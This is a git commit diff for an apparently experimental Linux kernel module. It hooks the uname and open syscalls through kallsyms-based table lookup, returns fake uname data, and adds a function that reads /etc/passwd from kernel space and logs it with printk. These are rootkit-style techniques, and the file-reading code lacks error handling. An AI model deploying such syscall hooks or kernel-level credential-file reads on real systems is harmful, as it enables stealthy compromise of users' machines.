daa603c25662d9f1a71433590264444b6c103f80
Oliver <Oliver.buckler@gmail.com>
2017-01-01 06:19:49 +1100

    added file reading from virtual file system

--- hooks.c
+++ hooks.c
@@ -3,6 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/utsname.h>
 #include <linux/cred.h>
+#include "io.h"
 
 asmlinkage int (*getuid_call)(void);
 // uid_t uid = getuid_call() -- returns unsigned int of uid
@@ -23,6 +24,9 @@ asmlinkage int overide_uname(struct new_utsname *buf)
 	struct new_utsname *p_uts = &our_uts;
 
 	*buf = *p_uts;
+	
+
+	read_file();
 
 	return 0; //original_uname(buf);
 }
@@ -30,7 +34,7 @@ asmlinkage int overide_uname(struct new_utsname *buf)
 asmlinkage int (*original_open) (char* file, int flag, int mode);
 asmlinkage int overide_open(char* file, int flags, int mode)
 {
+
 	//printk(KERN_INFO "[Hook]:\tOpen(%s, %d, %d)\n", file, flags, mode);
 	return original_open(file, flags, mode);
 }
-
--- io.c
+++ io.c
@@ -1,7 +1,34 @@
 #include <linux/module.h>
 #include <linux/kallsyms.h>
 
+/* read_file() */
+#include <linux/fs.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+#include <linux/buffer_head.h>
+
 unsigned long table_addy;
+
+int read_file(void)
+{
+	loff_t offset = 0;
+	char str[1024];
+	struct file* f;
+	mm_segment_t fs;
+	
+	f = filp_open("/etc/passwd",O_RDONLY,0644);
+	fs = get_fs();
+	set_fs(get_ds());
+
+	vfs_read(f, str,1024, &offset);
+
+	set_fs(fs);
+	filp_close(f,NULL);
+
+	printk(KERN_INFO "file contents:\n%s\n", str);
+
+	return 0;
+}
 
 int prsyms_print_symbol(void* data, const char* namebuf,
 							   struct module* module, unsigned long address)
@@ -16,4 +43,5 @@ int prsyms_print_symbol(void* data, const char* namebuf,
 
 	return 0;
 }
+
 
